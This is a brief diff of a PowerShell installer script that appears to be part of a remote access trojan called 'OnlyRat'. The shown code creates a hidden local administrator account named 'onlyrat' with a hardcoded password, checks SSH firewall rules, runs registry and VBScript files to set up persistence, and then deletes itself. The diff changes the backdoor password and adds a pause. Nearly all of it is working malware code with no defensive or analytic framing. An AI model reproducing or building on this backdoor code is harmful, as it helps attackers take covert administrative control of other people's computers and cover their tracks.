@@ -25,7 +25,7 @@ function Create-NewLocalAdmin {
     }
 }
 $NewLocalAdmin = "onlyrat"
-$Password = (ConvertTo-SecureString "12192003" -AsPlainText -Force)
+$Password = (ConvertTo-SecureString "OnlyRat123" -AsPlainText -Force)
 Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # varaibles
@@ -59,6 +59,8 @@ Get-NetFirewallRule -Name *ssh*
 
 # install the registry
 ./"$reg_file.reg";"$vbs_file.vbs"
+
+pause
 
 # self delete
 cd $initial_dir
